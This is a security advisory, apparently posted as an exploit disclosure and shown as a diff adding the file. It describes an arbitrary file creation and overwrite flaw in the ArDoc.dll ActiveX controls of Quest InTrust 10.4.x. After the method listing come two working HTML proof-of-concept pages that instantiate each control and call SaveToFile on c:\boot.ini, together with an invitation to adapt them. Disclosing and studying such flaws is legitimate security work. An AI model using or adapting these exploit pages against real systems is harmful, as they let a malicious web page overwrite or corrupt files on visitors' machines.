@@ -1,0 +1,115 @@
+Quest InTrust 10.4.x ReportTree and SimpleTree Classes
+ArDoc.dll ActiveX Control Remote File Creation / Overwrite
+
+homepage: http://www.quest.com/intrust/
+
+description: "InTrust securely collects, stores, reports and 
+alerts on event log data from Windows, Unix and Linux systems, 
+helping you comply with external regulations, internal policies 
+and security best practices."
+
+
+download url of a test version:
+http://www.quest.com/downloads/
+
+file tested: Quest_InTrust---Full-Package_104.zip
+
+Background:
+
+The mentioned product, when installed, registers two classes
+with the following settings:
+
+binary path: C:\Program Files\Common Files\Aelita Shared\ARDoc.dll
+CLSID: {C6FAAD6A-68AE-452B-9F7A-9293408F51EF}
+ProgID: ARDOC.ReportTree.1
+Implements IObjectSafety: yes
+Safe For Scripting (IObjectSafety): True
+Safe For Initialization (IObjectSafety): ?
+
+binary path: C:\Program Files\Common Files\Aelita Shared\ARDoc.dll
+CLSID: {EB5920E8-F6FA-4080-ADDC-AA03FA23E2AB}
+ProgID: ARDOC.SimpleTree.1
+Implements IObjectSafety: yes
+Safe For Scripting (IObjectSafety): True
+Safe For Initialization (IObjectSafety): ?
+
+According to IObjectSafety interface, this control is safe
+for scripting then Internet Explorer will allow scripting
+of this control.
+
+Vulnerability:
+both classes expose insecure methods (read/write):
+
+
+...
+/* DISPID=34 */
+/* VT_BOOL [11] */
+function LoadFromFile(
+        /* VT_BSTR [8]  */ $bstrFileName
+        )
+{
+        /* method LoadFromFile */
+}
+/* DISPID=35 */
+/* VT_BOOL [11] */
+function SaveToFile(
+        /* VT_BSTR [8]  */ $bstrFileName
+        )
+{
+        /* method SaveToFile */
+}
+...
+
+SaveToFile() allows arbitrary file creation and overwrite.
+
+The resulting file has the following header:
+
+D0 CF 11 E0 A1 B1 1A E1 00 00 00 00 ...
+
+This seems a Microsoft Office file.
+
+As attachment, two pocs, overwriting the boot.ini file. Change for your needs.
+
+Other attacks are possible, including remote code execution
+if the attacker is able to control file content.
+At the time of report, however, this could not be achieved. I
+will post updates on this if demonstrated.
+
+
+
+<!--
+Quest InTrust 10.4.x SimpleTree Class ActiveX Control Remote File Overwrite
+
+binary path: C:\Program Files\Common Files\Aelita Shared\ARDoc.dll
+CLSID: {EB5920E8-F6FA-4080-ADDC-AA03FA23E2AB}
+ProgID: ARDOC.SimpleTree.1
+Implements IObjectSafety: yes
+Safe For Scripting (IObjectSafety): True
+Safe For Initialization (IObjectSafety): ?
+-->
+<!-- saved from url=(0014)about:internet -->
+<html>
+<object classid='clsid:EB5920E8-F6FA-4080-ADDC-AA03FA23E2AB' id='obj' WIDTH=640 height=480 />
+</object>
+<script>
+obj.SaveToFile("c:\\boot.ini");
+</script>
+
+
+<!--
+Quest InTrust 10.4.x ReportTree Class ActiveX Control Remote File Overwrite
+
+binary path: C:\Program Files\Common Files\Aelita Shared\ARDoc.dll
+CLSID: {C6FAAD6A-68AE-452B-9F7A-9293408F51EF}
+ProgID: ARDOC.ReportTree.1
+Implements IObjectSafety: yes
+Safe For Scripting (IObjectSafety): True
+Safe For Initialization (IObjectSafety): ?
+-->
+<!-- saved from url=(0014)about:internet -->
+<html>
+<object classid='clsid:C6FAAD6A-68AE-452B-9F7A-9293408F51EF' id='obj' />
+</object>
+<script>
+obj.SaveToFile("c:\\boot.ini");
+</script>
